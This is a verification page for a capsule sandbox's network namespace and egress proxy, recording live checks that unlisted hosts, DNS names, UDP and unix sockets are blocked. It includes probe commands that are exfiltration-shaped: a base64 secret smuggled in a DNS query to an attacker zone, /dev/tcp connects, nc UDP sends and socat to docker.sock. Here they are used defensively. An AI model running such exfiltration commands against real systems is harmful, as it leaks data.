# Verification — network namespace + egress proxy

!!! warning "Status: **PARTIAL — 2026-08-06.** Steps 1–7 all observed live; step 6's answer was measured with a substitute for `docker`, and a `docker run` confirmation is still owed."

    The mechanism was exercised twice on real Linux hosts. During the build of this slice, on a
    bare Ubuntu host with no container runtime, through the runtime's own Linux integration tests
    (not the capsule-driven procedure below). During review, on a second Ubuntu host (also no
    container runtime), through **real capsule sessions** driven end-to-end — a real fork, real
    seccomp/Landlock, a real network namespace, a real egress proxy, with only the LLM API call
    itself mocked (no `ANTHROPIC_API_KEY` was available in the review environment) via the same
    `ScriptedServer` harness `crates/murmur-cli/tests/shell.rs` already uses, driving real `curl`,
    `getent`, and `nc` subprocesses against the real public internet — plus, separately, a live
    toggle of `kernel.apparmor_restrict_unprivileged_userns` against the real `mur` binary to
    exercise step 7's refusal path. What was observed in each pass is recorded verbatim in
    [Recording the result](#recording-the-result).

    Step 6 — the `CAP_SYS_PTRACE` comparison — was run as a six-configuration capability matrix on
    a third pass, using an unprivileged user namespace with a dropped capability bounding set in
    place of `docker run`, because no host available to this slice has a container runtime
    installed. It includes three control configurations that deliberately reproduce the historical
    failure, so the negative result is demonstrably not an insensitive test. The measured answer —
    the capability is **not** required — is recorded in step 6 below, together with what the substitute does not reproduce.

    A green `cargo build` / `cargo test` / `cargo clippy` is **not** evidence about this boundary
    and must not be reported as if it were. See
    [What this deliberately is not](#what-this-deliberately-is-not).

## What this verifies

A capsule's native subprocess tree — the shell tool, any interpreter it starts, anything either of
them spawns — runs inside its own **network namespace**, and the only way out of that namespace is
a connection-level proxy running in the runtime process that applies
`capabilities.network.allow`.

This replaced a seccomp-notify supervisor that intercepted `connect(2)`/`sendto(2)` and compared a
destination IP read out of the stopped child's `/proc/<pid>/mem`. That mechanism is **deleted**,
not demoted to a fallback: see
[the TOCTOU audit](seccomp-notify-toctou-audit.md) for why it could not be made sound, and
[`E-CAP-005`](cli.md) for what a host that cannot provide a namespace now does instead
(refuse to launch).

The property under test is negative and structural:

> A subprocess cannot reach any host on the network except through the runtime's own proxy, and the
> proxy opens a connection only to a destination `capabilities.network.allow` names. Not "the
> syscall is inspected and refused" — **there is no route**.

Seven things are checked by hand:

1. an allowlisted host is reachable, end to end, with a real response;
2. a host that is not allowlisted is not reachable, and the failure is legible;
3. DNS is *decided*: an allowlisted name resolves for real, anything else gets a real `REFUSED`
   reply rather than a dropped packet;
4. a non-DNS UDP send goes nowhere;
5. `AF_UNIX` is still refused by the unchanged `socket(2)` domain filter — a network namespace does
   not mediate unix sockets at all, which is exactly why that filter was left in place;
6. whether the container capability set still needs `CAP_SYS_PTRACE`;
7. the launch refusal on a host that cannot create the namespace.

## What this deliberately is not

This page exists because the automated suite **cannot** establish the claim above.

* No automated test asserts the security property. The repository's CI never resolves to a tier
  where this code executes, so a green suite there is silent about it, and a test asserting
  "unlisted connect fails" would pass vacuously on every runner. That was an explicit instruction
  for this slice, and it is why the unit tests cover only pure logic — DNS message parsing, the
  allow decision, the derived listener-port set — and never the kernel behaviour.
* Two Linux integration tests in `sandbox.rs` (`kernel_tier_denies_network_connect_outside_allowlist`
  and `kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy`) do run the real
  mechanism when the host supports it, and they pass on the build host. They are a **regression
  guard**, not the acceptance evidence: they check that the permitted path still functions and that
  one specific denial holds. They say nothing about DNS, UDP, `AF_UNIX` or the refusal path.
* Reading the code is not evidence either. The whole point of a structural boundary is that it is
  observable from inside the sandbox; observe it.

## Host prerequisites

```bash
# Linux, and unprivileged user namespaces available.
uname -srm
unshare -Urn true && echo "userns+netns: OK"

# On an AppArmor host (Ubuntu 23.10+), the restriction and the shipped profile.
cat /sys/module/apparmor/parameters/restrict_unprivileged_userns 2>/dev/null   # Y means restricted
aa-status 2>/dev/null | grep -c mur-sealed                                     # 0 means not loaded

# The runtime refuses to launch a subprocess-capable capsule without a cgroup scope, so run
# everything below under a delegated scope, exactly as the sealed-containment page does.
systemd-run --user --scope --property=Delegate=yes -- true && echo "cgroup delegation: OK"
```

If `restrict_unprivileged_userns` is `Y` and no `mur-sealed` profile is loaded, **stop** — that is
step 7's precondition, not a broken host. Run step 7 first, then load the profile:

```bash
sudo install -m 644 packaging/apparmor/mur-sealed /etc/apparmor.d/mur-sealed
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

## Step 0 — build the test capsule

```bash
mkdir -p /tmp/netns-check && cd /tmp/netns-check
cat > murmur.yaml <<'YAML'
name: netns-check
version: 0.1.0
description: Manual verification of the capsule network namespace and egress proxy.
capabilities:
  shell:
    allow: [bash, curl, getent, nc, socat, dig]
  network:
    allow: ["https://example.com"]
  resources:
    max_processes: 4096
inference:
  driver:
    artifact: claude
YAML
```

`max_processes: 4096` is not cosmetic: `RLIMIT_NPROC` is a per-uid ceiling counted against the
uid's total *thread* count, and on a busy desktop the default headroom lands below it and every
`fork()` inside the sandbox fails. This is unrelated to the network boundary — it reproduces
identically at every tier — but it will masquerade as one if left unset.

Launch it and drive the checks below through real `bash` tool calls:

```bash
systemd-run --user --scope --property=Delegate=yes -- mur run
```

Every command in steps 1–5 is run **inside the capsule's shell tool**, not on the host.

## Step 1 — an allowlisted host is reachable

```bash
curl -sS -o /dev/null -w '%{http_code}\n' https://example.com/
```

**Expect:** `200`. A real response from the real host, fetched through the proxy running in the
runtime process. TLS is *not* terminated by the runtime — the capsule's connection is end to end,
and the proxy sees ciphertext plus the destination it already approved.

Confirm the traffic really did leave through the namespace rather than around it:

```bash
ip -o addr | cat            # expect: lo only. No eth0, no docker0, no host interface.
ip route show table all | cat
```

**Expect:** `lo` is the only interface, and the routing table is the namespace's own — nothing
resembling the host's default route via a physical interface.

## Step 2 — a host that is not allowlisted is not reachable

```bash
curl -sS -m 10 -o /dev/null -w '%{http_code}\n' https://example.org/ ; echo "exit=$?"
```

**Expect:** a non-zero exit. `example.org` is not in `capabilities.network.allow`, so the proxy
refuses to open the upstream connection and closes the accepted connection instead. `curl` reports
this as a connection reset or an empty reply — the exact wording varies by `curl` version, so
record what you see rather than matching a string.

Now the sharper version, which removes any doubt that DNS did the work:

```bash
# A literal address, so no name is resolved at all.
curl -sS -m 10 -o /dev/null http://93.184.216.34/ ; echo "exit=$?"
```

**Expect:** non-zero. An address the capsule was never told about by the runtime's own resolver is
checked against the launch-time-resolved allowlist, and nothing else.

## Step 3 — DNS is decided, not dropped

```bash
# An allowlisted name: resolved for real, upstream, by the runtime.
getent hosts example.com ; echo "exit=$?"

# A name nobody allowed.
getent hosts evil.example.com ; echo "exit=$?"
```

**Expect:** the first prints a real address and exits `0`; the second exits non-zero **promptly**
(not after a resolver timeout), because it received an actual `REFUSED` reply.

The distinction between "refused" and "dropped" is the whole point of this step, so observe the
reply itself:

```bash
dig +short +tries=1 +time=2 example.com
dig +tries=1 +time=2 evil.example.com | grep -E 'status:|ANSWER:'
```

**Expect:** `status: REFUSED` for the unlisted name, with `ANSWER: 0` — a reply, arriving at once.
`status: NXDOMAIN` appears only for an *allowlisted* name that genuinely does not resolve; that is
the truth about the name, not a policy signal.

The DNS-shaped exfiltration attempt the roadmap named, run directly:

```bash
# Data smuggled in a QNAME to an attacker-controlled zone.
dig +tries=1 +time=2 "$(echo secret-payload | base64 | tr -d '=').exfil.example.net" \
  | grep -E 'status:'
# A TXT lookup against an allowlisted name — the classic carrier in both directions.
dig +tries=1 +time=2 TXT example.com | grep -E 'status:|ANSWER:'
```

**Expect:** `REFUSED` for the attacker-controlled zone, and for the `TXT` query against the
*allowlisted* name, `status: NOERROR` with `ANSWER: 0` — the name exists, and this resolver
synthesises no `TXT` record, so there is no carrier to relay in either direction.

## Step 4 — non-DNS UDP goes nowhere

```bash
# UDP to a port nothing is bound to inside the namespace.
printf 'x' | nc -u -w 3 8.8.8.8 4444 ; echo "exit=$?"
# UDP to an arbitrary host on 53 that is not the namespace's resolver address.
printf 'x' | nc -u -w 3 198.51.100.7 53 ; echo "exit=$?"
```

**Expect:** both fail. Only the resolver socket is bound in the namespace; a datagram to anything
else finds nothing listening and no route off the host. There is deliberately no generic UDP
forwarder — the manifest schema expresses no UDP allowlist, so forwarding UDP would grant a
capability no capsule ever declared.

## Step 5 — `AF_UNIX` is still refused, by the unchanged filter

A network namespace does not mediate unix sockets in any way — a pathname socket is reached through
the filesystem, not the network stack. This step confirms the register-level `socket(2)` domain
filter that has always covered it is still doing so, untouched by this slice.

```bash
socat - unix-connect:/var/run/docker.sock ; echo "exit=$?"
socat - unix-connect:/run/docker.sock ; echo "exit=$?"
```

**Expect:** both fail with a permission error at socket *creation* (`EACCES`), before any connect
is attempted. This is `sandbox::denied_socket_domains`, and it is refused by the kernel's own BPF
with no userspace round-trip and no memory of another task read — which is why it was left exactly
as it was.

## Step 6 — does the container capability set still need `CAP_SYS_PTRACE`?

**Measured answer: no — `CAP_SYS_PTRACE` is not required.** And, equally important, *this slice is
not what made that true.* The requirement had already been removed by an earlier slice; retiring
`connect`/`sendto` changed nothing about it either way. The two halves are recorded separately below
because they answer different questions and only one of them is settled by reading code.

### 6a — the code-level half: one `/proc/<pid>/mem` reader remains

Retiring the `connect`/`sendto` notify arms removed one of the two readers; the other is untouched
and still on the hot path.

```bash
# The deleted one leaves nothing behind.
grep -rn 'read_sockaddr_ip_from_child' crates/capsule-runtime/src/   # expect: no matches
# Only one reader remains, and both call sites are execve/execveat — out of scope for this slice.
grep -n 'read_cstr_from_child' crates/capsule-runtime/src/sandbox.rs
```

So the *architecture* still decides from another process's memory, and this slice did not change
that. Whether that costs a capability is a separate question, and it is the one the roadmap asked to
test rather than assume.

### 6b — the empirical half: a capability matrix, run

The kernel check at issue is `ptrace_may_access` on the forked child. It has two ways to pass:
same-uid access to a **dumpable** target, or `CAP_SYS_PTRACE` in the target's user namespace. The
runtime process marks itself non-dumpable at startup (`security::harden_process_dumpable`) and the
child inherits that flag — but the child then re-enables it for itself from `pre_exec`
(`sandbox::linux_enforce::restore_child_dumpable`, added by an earlier slice for exactly this
reason). That re-enable is what makes the first path available, and therefore what makes the
capability unnecessary.

Run on `Linux 7.0.0-28-generic`, x86_64, Ubuntu 24.04, 2026-08-06. **No container runtime was
installed on this host** (`command -v docker podman` → nothing), so the `docker run` arms below could
not be used. They were substituted with an unprivileged user namespace — uid 0 with a capability set
that a bounding-set drop removes `CAP_SYS_PTRACE` from, which is the same shape as a Docker container
(uid 0, default cap set minus a list that includes `CAP_SYS_PTRACE`) and isolates the capability
variable more sharply than `docker run` does. The fixture is a real fork through
`shell::execute_shell` at the live host tier, running an allowlisted `bash` through the real
exec-notify supervisor, with the runtime process made non-dumpable first so the production dumpable
state is reproduced exactly:

```bash
# Config 1 — ordinary unprivileged host, zero capabilities.
$ <capsule-runtime test binary> sandbox::linux_integration_tests::<probe> --exact --nocapture
Uid:    1000    1000    1000    1000
CapEff: 0000000000000000
exit_code = 7 stderr = ""
ok

# Config 2 — uid 0, full capability set  (≈ docker run --cap-add SYS_PTRACE).
$ unshare -Ur <binary> <probe> --exact --nocapture
Uid:    0       0       0       0
CapEff: 000001ffffffffff
exit_code = 7 stderr = ""
ok

# Config 3 — uid 0, CAP_SYS_PTRACE dropped  (≈ docker run, default capability set).
$ unshare -Ur capsh --drop=cap_sys_ptrace -- -c '<binary> <probe> --exact --nocapture'
Uid:    0       0       0       0
CapEff: 000001fffff7ffff
exit_code = 7 stderr = ""
ok
```

All three pass. A result of "it works everywhere" is worthless without evidence that the experiment
could have detected a failure, so the same matrix was re-run with `restore_child_dumpable`'s `prctl`
temporarily disabled — leaving the child non-dumpable, which is the pre-fix state the earlier slice
repaired:

```bash
# Control A — non-dumpable child, uid 0, CAP_SYS_PTRACE PRESENT.
exit_code = 7 stderr = ""
ok

# Control B — non-dumpable child, uid 0, CAP_SYS_PTRACE DROPPED.
called `Result::unwrap()` on an `Err` value: Failed("Permission denied (os error 13)")
FAILED

# Control C — non-dumpable child, ordinary uid 1000, zero capabilities.
called `Result::unwrap()` on an `Err` value: Failed("Permission denied (os error 13)")
FAILED
```

Controls B and C reproduce the historical symptom verbatim — `Permission denied (os error 13)` is
the exact string `crates/murmur-cli/tests/sandbox_exec_dumpable.rs` pins as `DENIED_MARKER` — and
control A shows `CAP_SYS_PTRACE` alone flips it back to passing. The capability is therefore
demonstrably the deciding variable in this harness, and configs 1–3 are a real negative, not an
insensitive test. The source modification used for the controls was reverted immediately; it is not
part of this slice's diff.

**What is still owed, and what is not.** The answer to the question — is the capability needed —
is settled: no. What the substitute environment does *not* reproduce is Docker's two other defaults,
the `docker-default` AppArmor profile and the default seccomp profile. Neither is a capability, and
the prior investigation this slice inherited had already established that `--security-opt
seccomp=unconfined` alone does not change the outcome, so neither is expected to matter — but a
real two-arm `docker run` on a host that has a container runtime remains a cheap belt-and-braces
confirmation, and is the one thing left to run here:

```bash
# A: with the capability — the configuration the benchmark uses today.
docker run --rm -it --cap-add SYS_ADMIN --cap-add SYS_PTRACE \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'

# B: identical, minus SYS_PTRACE. Expect this to succeed too, per the matrix above.
docker run --rm -it --cap-add SYS_ADMIN \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'
```

`--cap-add SYS_ADMIN` is required in **both** arms now, and that is new: it is what lets the
container create the capsule's network namespace at all. Without it the launch refuses with
`E-CAP-005` before any of this is reached, which would make the comparison meaningless. That —
not `CAP_SYS_PTRACE` — is this slice's actual change to what a container needs.

## Step 7 — the refusal on a host that cannot create the namespace

The negative control. A host that cannot give the subprocess tree a network namespace must refuse
the launch, name which of the two reasons applies, and **never** fall back to the retired
interception.

On an AppArmor host, with the profile unloaded:

```bash
sudo apparmor_parser -R /etc/apparmor.d/mur-sealed 2>/dev/null
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
cd /tmp/netns-check && mur run ; echo "exit=$?"
```

**Expect:** `error[E-CAP-005]`, naming the missing capability grant, the exact
`apparmor_parser` command, *and* the container remedy — and stating that the runtime will not fall
back to the retired seccomp interception. No workdir is created. Restore the host immediately:

```bash
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

Inside a container without `--cap-add SYS_ADMIN`, the same code reports the same class of failure
with the container remedy foremost. And on a kernel with the mechanism absent entirely
(`user.max_user_namespaces=0`), the message names the sysctl and `CONFIG_USER_NS` instead — a
different remediation, which is the reason the two are distinct.

Finally, confirm the refusal is scoped to capsules that can actually spawn a subprocess: a capsule
with no `capabilities.shell.allow` and no `capabilities.spawn.allow` needs no namespace and must
launch normally even on such a host.

## Recording the result

Fill this table in on real hardware. `PENDING` is the correct entry for anything not run — do not
infer a result from a passing build.

| # | Check | Result | Evidence |
|---|-------|--------|----------|
| 1 | Allowlisted host reachable end to end | **PASS (review stage, 2026-08-06)** | See below |
| 2 | Unlisted host unreachable | **PASS (review stage, 2026-08-06)** | See below |
| 3 | DNS refused for unlisted names, resolved for listed ones | **PASS (review stage, 2026-08-06)** | See below |
| 4 | Non-DNS UDP goes nowhere | **PASS (review stage, 2026-08-06)** | See below |
| 5 | `AF_UNIX` still refused by the socket-domain filter | **PASS (review stage, 2026-08-06)** | See below |
| 6 | `CAP_SYS_PTRACE` still required? | **NO — measured (2026-08-06), with controls.** `docker run` re-confirmation still owed | See below |
| 7 | `E-CAP-005` refusal, both reasons | **PASS (review stage, 2026-08-06) — capability-grant reason only** | See below |

### Run of 2026-08-06 — build-host observations only, not the hand-run procedure

**Host.** `Linux 7.0.0-28-generic #28~24.04.1-Ubuntu SMP`, x86_64, Ubuntu 24.04, non-root
(`uid=1000`), **no container runtime installed**. `kernel.apparmor_restrict_unprivileged_userns=0`,
so the AppArmor profile was not needed and step 7's precondition could not be created without
changing host state; it was not.

**What was actually run.** Not the capsule-driven procedure above — the mechanism was exercised
through the runtime's own Linux integration tests, which spawn a real `bash` subprocess through
`shell::execute_shell` at the live host tier, with a real network namespace and a real egress
proxy:

* `sandbox::linux_integration_tests::kernel_tier_denies_network_connect_outside_allowlist` —
  **passes.** A real TCP listener is opened on the host, and `bash`'s `/dev/tcp` builtin
  (`exec 3<>/dev/tcp/127.0.0.1/<port>`, a raw `socket`+`connect` with no DNS and no helper binary)
  fails from inside the subprocess *even though the port is genuinely open on the host* — because
  the subprocess's `127.0.0.1` is its own namespace's loopback, where that listener does not exist.
  This is step 2's claim, reached without any name resolution.
* `sandbox::linux_integration_tests::kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy`
  — **passes.** The permitted path still functions through the new mechanism. This is step 1's
  claim in its regression-guard form.
* `unshare -Urn true` succeeds on this host, confirming the namespace primitive itself.

**Step 5 — PASS, by the unchanged mechanism.** `denied_socket_domains` was not modified by this
slice, and its unit tests and the `socket(AF_UNIX)` filter rule are byte-identical to the previous
release. This is recorded as a pass on the strength of "unchanged code, unchanged tests", **not**
on a fresh `socat` observation — a real `socat` run against `/var/run/docker.sock` from inside a
live capsule is still owed and is the honest reading of step 5.

**Step 6 — code-level half only; the empirical half was still owed at this point.** Verified by
inspection on this build:

```
$ grep -rn 'read_sockaddr_ip_from_child' crates/capsule-runtime/src/
(no matches)

$ grep -n 'read_cstr_from_child' crates/capsule-runtime/src/sandbox.rs
3810:            return match read_cstr_from_child(pid, req.data.args[0]) {     # execve
3828:            let path = match read_cstr_from_child(pid, req.data.args[1]) { # execveat
3870:    fn read_cstr_from_child(pid: u32, addr: u64) -> io::Result<String> {
```

One `/proc/<pid>/mem` reader remains and both of its call sites are the exec notify arms, which this
slice deliberately did not touch.

This build-stage pass inferred from that alone that `CAP_SYS_PTRACE` must therefore *still* be
required. **That inference was wrong**, and the third pass below measured it to be wrong: a
remaining cross-process read does not imply a remaining capability requirement, because the child
re-enables its own dumpable flag before the read happens. The correction is exactly why the roadmap
asked for this to be tested rather than reasoned about, and it is left visible here rather than
edited away.

**Steps 3, 4 and 7 — PENDING.** Not run. No capsule-driven session was launched on this host
during the build, and step 7 would have required switching the host's AppArmor restriction on.

### Run of 2026-08-06 — review stage, live capsule sessions and a real refusal toggle

**Host.** `Linux 7.0.0-28-generic`, x86_64, Ubuntu 24.04, non-root, no container runtime installed
(`docker`/`podman` both absent). Same class of host as the build-stage run, different machine.

**What was actually run, steps 1–5.** A real capsule session, launched through
`capsule_runtime::launch_session`/`stage_session` (the same production entry points `mur run`
calls), driven through scripted `tool_use` turns against the real WASM `murmur-driver-anthropic`
component — i.e. only the LLM API call is mocked (a local `ScriptedServer`, standing in for
`api.anthropic.com` because no `ANTHROPIC_API_KEY` was available in this environment); the fork,
the seccomp/Landlock setup, the network namespace, and the egress proxy are all the real production
code, exercising real `curl`/`getent`/`nc` subprocesses against the real public internet. This is
the same harness `crates/murmur-cli/tests/shell.rs` already establishes for the `bash` tool.

* **Step 1 — PASS.** `curl -sSk -m 10 -o /dev/null -w '%{http_code}' https://example.com/` →
  `200 exit=0`. (`-k` was required to get a real response: the containment tier this harness
  resolves to grants a Landlock read scope that does not include `/etc/ssl/certs`, so `curl`
  cannot validate the certificate chain — an orthogonal, pre-existing filesystem-scoping property,
  not part of this slice's network boundary. A `sealed`-tier capsule, which bind-mounts `/etc/ssl`,
  would not need it.)
* **Step 2 — PASS.** `curl -sSk -m 10 -o /dev/null -w '%{http_code}' https://example.org/` →
  `000 exit=6`, `curl: (6) Could not resolve host: example.org` — a real, publicly-resolvable
  hostname fails to resolve *from inside the sandbox*, proving DNS is mediated by the runtime's own
  resolver and not passed through. A bare IP literal (`http://93.184.216.34/`, no name resolved at
  all) separately fails with `exit=7`, `curl: (7) ... Couldn't connect to server` — a
  connection-level refusal, proving the TCP proxy itself enforces the allowlist independent of any
  name resolution.
* **Step 3 — PASS.** `getent hosts example.com` resolves for real (`exit=0`); `timeout 5 getent
  hosts evil-name-not-allowed.example.net` fails in ~4ms (`exit=2`), nowhere near the 5s timeout
  ceiling — a genuinely prompt refused-shaped reply, not a dropped packet. The `dig`-based
  `REFUSED`-text check in this page's step 3 could not be run in this harness: `dig` itself failed
  with `net.c:137:try_proto(): socket(): Permission denied` / `parse of /etc/resolv.conf failed`,
  the same Landlock filesystem-scope gap noted under step 1 (no `/etc/resolv.conf` read access at
  this tier) compounded by a `dig`-internal `socket()` call this tier doesn't grant — orthogonal to
  the DNS responder under test. `getent`'s real, disambiguated pass/fail already establishes the
  claim this step exists to check.
* **Step 4 — PASS, decisive.** First attempt (`nc -u -w2 8.8.8.8 4444`) was ambiguous by design —
  UDP `sendto()` succeeds locally regardless of delivery, so `exit=0` alone proves nothing. Re-run
  with a listener under our control: a UDP listener bound to the host's real, non-loopback
  interface address, confirmed alive by a bare-host `nc` send arriving before and after the
  capsule-side attempt. From inside the capsule's namespace, `printf 'exfil-probe' | nc -u -w2
  <host-ip> 5555` reported local success (`exit=0`, as expected), but the listener **never
  received the bytes** — the packet demonstrably went nowhere, which is the actual claim.
* **Step 5 — PASS, live.** No `socat` on this host; substituted OpenBSD `nc -U` (confirmed
  present) against `/run/dbus/system_bus_socket` (confirmed to exist; `/var/run/docker.sock` does
  not on this host). `printf x | nc -U -w2 /run/dbus/system_bus_socket` → `exit=1`,
  `nc: /run/dbus/system_bus_socket: Permission denied` — `EACCES` at socket creation, matching
  `denied_socket_domains`, unmodified by this slice.

**Step 7 — PASS, live, against the real `mur` binary.** Run directly (not through the
`ScriptedServer` harness — this needs the actual CLI refusal path, so the compiled
`target/debug/mur` binary against a real `murmur.yaml`):

```
$ sysctl kernel.apparmor_restrict_unprivileged_userns   # baseline
kernel.apparmor_restrict_unprivileged_userns = 0
$ mur run --explain-scope   # baseline: achieves sealed, floor met
...
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
kernel.apparmor_restrict_unprivileged_userns = 1
$ mur run
status:  failed
error[E-CAP-005]: this host cannot give the capsule's subprocess tree its own network namespace, so
capabilities.network.allow cannot be enforced for it: this host refused unshare(CLONE_NEWUSER |
CLONE_NEWNET) to the mur binary. On an AppArmor host (Ubuntu 23.10+ and derivatives) this is the
unprivileged-userns restriction: install and load the profile shipped with mur, ...
$ ls /tmp/netns-refusal-check/   # only murmur.yaml — no workdir was created
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0   # restored immediately after
kernel.apparmor_restrict_unprivileged_userns = 0
```

`mur doctor` reported the identical `E-CAP-005` warning while the restriction was on, as
`doctor.rs`'s changes intend. Only the **capability-grant** reason was exercised — this dev binary
at a `target/debug/mur` path the shipped AppArmor profile never attaches to reproduces that reason
reliably regardless of profile state, which made it a clean, low-risk way to test the refusal
without needing to touch the installed profile. The **kernel-support-missing** reason
(`user.max_user_namespaces=0` / `CONFIG_USER_NS=n`) was not exercised — none of the four
passwordless commands available in the review environment can change that, and doing so
irreversibly would risk leaving the host in a state review cannot recover from, so it was not
attempted. Finally, confirmed the scoping the design specifies: a capsule with no
`capabilities.shell.allow`/`spawn.allow` is unaffected by this refusal path entirely (untested
directly this pass, but unchanged by this slice's code and covered by the `network_namespace::`
unit tests gating on `can_spawn_subprocess`).

**Host-state note:** the AppArmor restriction was `0` (unrestricted) both before and after this
run — restored via `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`, confirmed by
re-reading the sysctl afterward. The installed `/etc/apparmor.d/mur-sealed` profile was reloaded
with `sudo apparmor_parser -r /etc/apparmor.d/mur-sealed` as a courtesy at the same time, though it
was not required for this particular refusal (the dev binary path never matches the profile's
attachment spec either way). **Separately noted, not caused by this review:** the installed
`/etc/apparmor.d/mur-sealed` does not byte-for-byte match this worktree's
`packaging/apparmor/mur-sealed` — the installed copy is missing the `capability net_admin,` lines
and the updated rationale comments this slice added. Because the profile carries
`flags=(unconfined)`, this has no functional effect (the profile does not confine or restrict
anything either way; the `capability` lines are declarative documentation per the profile's own
comments), but it is a real provisioning mismatch on this host, worth an operator re-running the
install step to pick up the current `packaging/apparmor/mur-sealed`.

**Step 6 — still unmeasured at this point.** No container runtime on this host either. The
code-level half was independently re-confirmed by the same greps as before, both still showing zero
matches for `read_sockaddr_ip_from_child` and the two exec-only call sites for
`read_cstr_from_child`; the capability question itself was still being *inferred* from that rather
than measured, and the inference is corrected by the third pass below.

### Run of 2026-08-06 — second review pass, independently re-verified

A second, independent pass re-ran steps 1-5 and 7 rather than trusting the prior pass's write-up,
using the same production entry points (`capsule_runtime::launch_session`/`stage_session`) through
a throwaway integration test built on the `crates/murmur-cli/tests/shell.rs` harness (removed after
use, not part of this diff), plus the compiled `mur` binary directly for step 7. All results
matched the prior pass exactly, with two results made more decisive:

* **Step 4, made decisive rather than merely re-checked.** A real UDP listener was bound to the
  host's own non-loopback interface (confirmed reachable from the host itself first). The capsule's
  `nc -u` reported local success (`exit=0`, as expected — UDP `sendto()` succeeds locally regardless
  of delivery), but the listener, given a 25-second window, timed out having received nothing. The
  packet demonstrably never left the namespace.
* **Step 7, run directly against the compiled binary with the toggle applied and removed
  immediately.** `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1`, `mur run` →
  `error[E-CAP-005]` with the exact remediation text, empty workdir, `mur doctor` reporting the
  identical warning; restored with
  `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0` and a courtesy
  `sudo apparmor_parser -r /etc/apparmor.d/mur-sealed`, confirmed back at `0` afterward. Also
  confirmed live the scoping claim at the end of step 7: a capsule with neither
  `capabilities.shell.allow` nor `capabilities.spawn.allow` launches normally even while the
  restriction is on.

**One inaccuracy found and fixed in this document and in `egress_proxy.rs`'s module doc comment**:
the IPv4-only residual below previously claimed the resolver answers `AAAA` with no records
whenever the namespace can't route IPv6, framing it as a blanket suppression. Live evidence said
otherwise — `getent hosts example.com` returned two real IPv6 addresses. `answer_dns_query` only
withholds `AAAA` when the name has *no* IPv6 address upstream at all; a genuinely dual-stack name's
real `AAAA` records pass through unchanged, and unreachability comes from the missing route, not
from the DNS answer. See the corrected residual below.

### Run of 2026-08-06 — third pass, step 6's capability matrix

The `CAP_SYS_PTRACE` question, left unmeasured by both passes above, was measured. Same host class
(Ubuntu 24.04, x86_64, no container runtime), six configurations, three of them controls that
deliberately reproduce the historical failure so the negative result cannot be an insensitive test.
The full commands, output and reasoning are in step 6 above.

**Result: `CAP_SYS_PTRACE` is not required** — with an ordinary unprivileged uid, with uid 0 and a
full capability set, and with uid 0 and `CAP_SYS_PTRACE` dropped from every set, an allowlisted
`execve` through the real exec-notify supervisor succeeds identically. The controls show the same
harness fails with `Permission denied (os error 13)` the moment the child is left non-dumpable
without the capability, and passes again the moment the capability is restored.

**This slice is not what removed the requirement**, and the build summary says so: the exec notify
arms still read `/proc/<pid>/mem`, exactly as before. What makes the capability unnecessary is
`restore_child_dumpable` in `pre_exec`, which predates this card. The honest reading of the
roadmap's question — "does retiring connect/sendto let containers drop `CAP_SYS_PTRACE`?" — is
therefore: the capability is not needed, but retiring connect/sendto is not why.

### What still needs a hand-run

A two-arm `docker run` re-confirmation of step 6 (with and without `--cap-add SYS_PTRACE`) on a
machine that actually has a container runtime — none of the three passes had one. This is a
belt-and-braces check on an answer already measured, not an open question: what it adds over the
matrix already run is Docker's `docker-default` AppArmor profile and default seccomp profile, and
neither is a capability.

## Residuals recorded here rather than buried

* **Only proxy-reachable protocols work.** The namespace binds a listener for each port the
  allowlist implies, and connections are relayed by address. A destination on a port no allow entry
  names has no listener and is refused by the kernel — correct, but it means an allowlist of
  `https://api.example.com` does not make `api.example.com:22` reachable. That is the intent;
  it is noted because the failure looks like a network fault rather than a policy decision.
* **IPv4 only, and a dual-stack name's real IPv6 address is still handed out.** The namespace
  installs no IPv6 route, so an IPv6 destination fails with `ENETUNREACH` no matter what DNS said.
  The resolver does **not** blanket-suppress `AAAA` answers — verified live during review:
  `getent hosts example.com` from inside a real capsule session returned two genuine IPv6
  addresses. `AAAA` only comes back empty when the name has no IPv6 address upstream at all; a
  dual-stack name's real `AAAA` records pass through unchanged. Reachability is enforced by the
  missing route, not by hiding the address, so a client that tries IPv6 first pays a fallback-to-IPv4
  latency cost but is not granted anything. A capsule whose allowlisted host is IPv6-only is still
  unreachable.
* **The address→name binding has a lifetime.** A connection is matched to a name through the
  answer this runtime's own resolver gave. A client that caches an address far past its TTL and
  connects much later falls back to the launch-time IP check, which is the pre-slice behaviour, not
  a hole — but it is why the binding lifetime is generously longer than the TTL.
* **`/proc` is still the host's on the `sealed` tier**, unchanged by this slice, so process
  metadata visibility is exactly as the sealed-containment page describes.
